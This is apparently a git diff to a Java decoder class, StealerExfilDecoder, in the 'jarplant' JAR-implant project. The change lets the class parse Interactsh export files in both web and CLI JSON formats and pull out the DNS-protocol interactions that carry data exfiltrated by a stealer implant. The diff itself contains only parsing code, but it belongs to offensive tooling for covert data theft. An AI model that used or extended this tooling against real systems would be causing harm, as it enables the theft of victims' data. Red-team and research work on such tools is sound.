@@ -1,7 +1,11 @@
 package io.github.w1th4d.jarplant.implants.utils;
 
+import com.fasterxml.jackson.core.JsonFactory;
+import com.fasterxml.jackson.core.JsonParseException;
+import com.fasterxml.jackson.core.JsonParser;
 import com.fasterxml.jackson.core.JsonProcessingException;
 import com.fasterxml.jackson.databind.JsonNode;
+import com.fasterxml.jackson.databind.MappingIterator;
 import com.fasterxml.jackson.databind.ObjectMapper;
 
 import java.io.IOException;
@@ -64,18 +68,58 @@ public class StealerExfilDecoder {
         return parseInteractshExport(new String(exportFileContent, StandardCharsets.UTF_8));
     }
 
+    private static List<JsonNode> parseWebJson(JsonNode rootNode) throws JsonProcessingException {
+        List<JsonNode> result = new ArrayList<>();
+        //JsonNode dataNode = rootNode.path("app").path("data");
+        JsonNode appNode = rootNode.get("app");
+        JsonNode appJson = new ObjectMapper().readTree(appNode.asText());   // They put JSON in your JSON...
+        JsonNode data = appJson.get("data");
+        // Only iterate if it's actually an array
+        if (data.isArray()) {
+            data.forEach(result::add);
+        }
+        return result;
+    }
+
+    private static List<JsonNode> parseCliJson(String input) throws JsonParseException {
+        List<JsonNode> result = new ArrayList<>();
+        ObjectMapper objectMapper = new ObjectMapper();
+        JsonFactory factory = objectMapper.getFactory();
+
+        try (JsonParser parser = factory.createParser(input)) {
+            while (parser.nextToken() != null) {
+                JsonNode node = objectMapper.readTree(parser);
+                if (node != null) {
+                    result.add(node);
+                }
+            }
+        } catch (IOException e) {
+            throw new JsonParseException(null, "Error processing JSON", e);
+        }
+        return result;
+    }
+
+    private static boolean isWebJson(JsonNode rootNode) {
+        JsonNode appNode = rootNode.path("app");
+        return !appNode.isMissingNode();
+    }
+
     public Set<String> parseInteractshExport(String exportFileContent) throws JsonProcessingException {
         Set<String> allFqdns = new HashSet<>();
 
         ObjectMapper jsonParser = new ObjectMapper();
         JsonNode json = jsonParser.readTree(exportFileContent);
+        List<JsonNode> data;
+        if (isWebJson(json)) {
+            data = parseWebJson(json);
+        } else {
+            data = parseCliJson(exportFileContent);
+        }
 
-        JsonNode appNode = json.get("app");
-        JsonNode appJson = new ObjectMapper().readTree(appNode.asText());   // They put JSON in your JSON...
-        JsonNode data = appJson.get("data");
-        // Maybe some day someone needs to parse terabytes of data. Until that day, we're keeping it simple.
         for (JsonNode dataObj : data) {
-            if (!dataObj.get("protocol").asText().equals("dns")) {
+
+
+            if (!dataObj.path("protocol").asText().equals("dns")) {
                 continue;
             }
 
